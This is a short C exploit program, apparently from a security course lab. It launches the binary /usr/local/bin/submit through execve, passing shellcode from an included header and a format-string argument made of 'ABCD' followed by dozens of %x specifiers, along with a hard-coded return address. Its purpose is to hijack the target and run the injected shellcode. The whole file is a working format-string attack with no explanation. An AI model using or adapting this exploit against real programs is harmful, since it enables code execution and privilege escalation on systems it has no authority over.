#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#include "shellcode.h"

#define TARGET "/usr/local/bin/submit"
#define ADDRESS "\x03\xde\xbf\xff"

int main(void)
{
  char *args[4];
  char *env[] = { NULL };

  args[0] = shellcode;
  args[1] = "ABCD %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x %x ";
  args[2] = shellcode;
  args[3] = NULL;

  if (execve(TARGET, args, env) < 0)
    fprintf(stderr, "execve failed.\n");
  
  exit(0);
}
